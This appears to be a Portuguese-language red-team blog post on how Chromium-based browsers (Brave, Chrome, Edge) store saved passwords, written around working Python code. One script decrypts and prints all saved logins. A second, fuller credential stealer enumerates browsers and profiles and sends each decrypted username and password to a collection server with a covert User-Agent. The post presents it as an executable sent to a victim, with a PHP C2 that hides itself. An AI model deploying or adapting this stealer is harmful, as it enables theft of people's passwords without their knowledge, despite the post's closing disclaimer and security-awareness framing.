---
title: "Extraindo senhas salvas no navegador"
classes: wide
header:
  teaser: /assets/images/BCred/00.jpg
  overlay_image: /assets/images/BCred/00.jpg
  overlay_filter: 0.5
ribbon: DarkSlateGray
excerpt: "Nessa postagem mostro como o navegador salva uma credencial e como podemos extraí-las"
description: "Nessa postagem mostro como o navegador salva uma credencial e como podemos extraí-las"
categories:
  - Web Hacking
tags:
  - Browser
  - Criptografia
  - Red Team
  - Python
toc: true
toc_sticky: true
toc_label: "Sumário"
toc_icon: "terminal"
---

# Introdução

Você já se perguntou como funciona o autocomplete dos navegadores? Bom, ele deve salvar as suas credenciais em um local seguro... certo? 

A ideia desse post é mostrar como todo esse processo funciona, mostrar como é mais simples do que você imagina extrair as senhas salvas pelo navegador e, por fim, dar uma ideia de uma possível utilização dessa técnica em um teste real

Então, vamos começar pelo começo

# Como a criptografia AES funciona

O AES é um algoritmo de criptografia que utiliza a chave simétrica, ou seja, o algoritmo usa a mesma chave para criptografia e descriptografia

Basicamente o AES utiliza uma chave criptográfica (encrypted key) e faz algumas operações matemáticas para encriptar a senha

Para melhorar a segurança é possível adicionar um vetor de inicialização, que normalmente é um valor aleatório, o que torna mais difícil realizar a quebra da criptografia, uma vez que você precisa de duas informações para realizar a descriptografia (chave criptográfica e o vetor de inicialização) 


![](/assets/images/BCred/bc-01.png){: .align-center}

# Como o navegador salva as senhas

> *Para demonstração vou utilizar como exemplo o Brave (que é o navegador que eu uso), como ele é baseado no Chrome, tudo que vou mostrar aqui também pode ser utilizado com o Google Chrome, somente sendo necessário alterar o caminho dos diretórios*

Após realizar o processo de criptografia que foi visto acima, essas informações são salvas em dois arquivos diferentes

A chave criptográfica (encrypted key) é salva dentro do arquivo "Local State" que pode ser encontrado seguindo esse caminho:

```
C:\Users\<username>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State
```

Abrindo o arquivo e lendo suas informações, é possível encontrar a informação que precisamos

![](/assets/images/BCred/bc-02.png){: .align-center}

Após o processo de criptografia, o resultado final é concatenado com o vetor de inicialização e tudo isso é salvo como sendo a senha criptografada e essa informação é salva dentro de um SQLite3

Esse arquivo tem o nome "Login Data" e pode ser encontrado seguindo o seguinte caminho:

```
C:\Users\<username>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data
```

![](/assets/images/BCred/bc-03.png){: .align-center}

Agora, já temos todas as informações necessárias para extrair as senhas que estão salvas no navegador

# Criando um script para extrair as credenciais

Como já sabemos o caminho dos arquivos e como o AES funciona, basta agora automatizar todo esse processo. Para isso eu vou criar um script em Python

Basicamente o que o script faz é buscar esses arquivos e extrair as informações que precisamos (encrypted_key, vetor de inicialização e a senha criptografada), após isso ele realiza o decode da senha e printa as informações

```python
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

appdata = os.environ['USERPROFILE']
PATH_LSTATE = os.path.normpath(f"{appdata}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")
PATH = os.path.normpath(f"{appdata}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")

with open( PATH_LSTATE, "r", encoding='utf-8') as f:
    local_state = f.read()
    local_state = json.loads(local_state)
secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
secret_key = secret_key[5:] 
secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

login_db = os.path.normpath(r"%s\Default\Login Data"%(PATH))
shutil.copy2(login_db, "Loginvault.db")
conn = sqlite3.connect("Loginvault.db")

if(secret_key):
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index,login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        if(url!="" and username!="" and ciphertext!=""):

            iv = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode()

            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_pass))

    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
```

Executando o script, é possível extrair as minhas credenciais salvas no navegador, nesse caso o meu acesso ao site do duolingo

![](/assets/images/BCred/bc-04.png){: .align-center}

# Exemplo prático de uso

Para mostrar um possível uso prático, vamos imaginar um cenário onde o atacante deseja extrair as credenciais da vítima e enviar essas informações para um C2

Nesse caso é necessário criar 2 script: um client e um server

## Client

Nesse exemplo, eu vou utilizar o mesmo script python usado anteriormente, somente vou adicionar algumas funções a mais, como por exemplo, uma função para identificar os navegadores presentes na máquina da vitima e a requisição que vai enviar as informações encontradas para o servidor

O script final ficou assim:

```python
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests

  

appdata = os.environ['USERPROFILE']
browsers = {

    'google-chrome-sxs': appdata + '\\AppData\\Local\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\AppData\\Local\\Google\\Chrome\\User Data',
    'microsoft-edge': appdata + '\\AppData\\Local\\Microsoft\\Edge\\User Data',
    'brave': appdata + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data',
}

def get_secret_key():
    try:
        with open( PATH_LSTATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        return ""

def get_db_connection(login_db):
    try:
        shutil.copy2(login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except:
        return None

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available  

def getting_path(browser):
    path = browsers[browser]
    global PATH_LSTATE
    global PATH
    PATH_LSTATE = os.path.normpath(f"{path}\\Local State")
    PATH = os.path.normpath(f"{path}")

if __name__ == '__main__':
    try:
        Browsers = installed_browsers()
        for Browser in Browsers:
            getting_path(Browser)
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                login_db = os.path.normpath(r"%s\%s\Login Data"%(PATH,folder))
                conn = get_db_connection(login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            enc = base64.b64encode(bytes(f"{index},{url},{username},{decrypted_password}",'utf-8'))

                            r = requests.get(f'http://127.0.0.1/cred.php?p={enc}', headers={"User-Agent":"Aq1xswdE3"})
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except:
        ...
```

Talvez você tenha reparado que a requisição feita para o servidor está usando um user agent um pouco estranho, mas isso vai fazer sentido mais pra frente

Então, a partir desse código gerei um executável que será enviado para a vítima

![](/assets/images/BCred/bc-05.png){: .align-center}

## Server

Como servidor, utilizei um código em PHP extremamente simples. Primeiro ele verifica o user agent, se não for o esperado ele redireciona para uma página que não existe, isso serve para evitar que alguém que encontrou o endereço acesse o site e veja alguma informação, se passar desse primeiro filtro, recebe o valor via parâmetro get e então salva em um arquivo

![](/assets/images/BCred/bc-06.png){: .align-center}

Testando acessar o endereço via navegador, o filtro inicial funciona, e o usuário é redirecionado para 404.php

![](/assets/images/BCred/bc-07.png){: .align-center}

## Executando o ataque

Com tudo pronto, o executável foi enviado para a máquina da vítima e então, o programa foi executado. Como pode ser visto abaixo, o prompt de comando abre e fecha rapidão (pode confiar rs) e nada mais acontece

![](/assets/images/BCred/bc-08.gif){: .align-center}

Para o cliente, a impressão é de que o programa não funcionou, porém no servidor um novo arquivo é criado

![](/assets/images/BCred/bc-09.png){: .align-center}

Acessando o arquivo encontramos a senha que estava salva no navegador em texto claro

![](/assets/images/BCred/bc-10.png){: .align-center}

> *Os códigos usados nesse exemplo são muito simples e tem o intuito somente de trazer uma ideia, não utilize em um ambiente real*

# Conclusão

Como mencionei no começo, a minha ideia aqui era mostrar que ter acesso as credenciais salvas no navegador não é algo muito difícil, e por isso não é seguro, então pare de salvar suas senhas lá

O que eu mostrei aqui foi algo muito simples, porém, tente pegar a ideia da coisa toda e criar algumas aplicações mais complexas a partir dai, isso pode servir de insight durante um teste 